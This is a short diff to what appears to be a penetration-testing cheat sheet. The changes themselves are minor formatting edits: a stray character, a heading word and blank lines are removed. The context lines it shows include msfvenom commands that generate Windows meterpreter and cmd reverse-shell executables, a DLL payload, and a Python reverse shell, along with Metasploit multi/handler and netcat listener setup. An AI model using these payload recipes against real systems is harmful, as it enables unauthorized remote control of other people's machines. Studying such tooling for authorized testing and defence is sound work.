@@ -11,7 +11,7 @@ msfvenom -p  windows/meterpreter/reverse_tcp =YourIP =YourPort -f exe shell-mete
 ```
 
 ####
->Executable with Windows cmd
+Executable with Windows cmd
 ```
  msfvenom -p windows/shell/reverse_tcp =YourIP =YourPort -f exe shell-cmd.exe
 ```
@@ -31,12 +31,10 @@ msfvenom -f dll -p windows/exec CMD="C:\windows\system32\calc.exe"-oshell32.dll
 ```
 
 
-Languages
 ### Python
 ```
 msfvenom -p cmd/unix/reverse_python LHOST=YourIP LPORT=YourPort -f raw
 ```
-
 
 
 ### Powershell
@@ -70,7 +68,6 @@ In Metasploit set Listener for Linux Meterpreter
 use exploit/multi/handler 
 payload linux/x86/meterpreter/reverse_tcp
 ```
-
 
 #### Set Netcat Listener
 ```
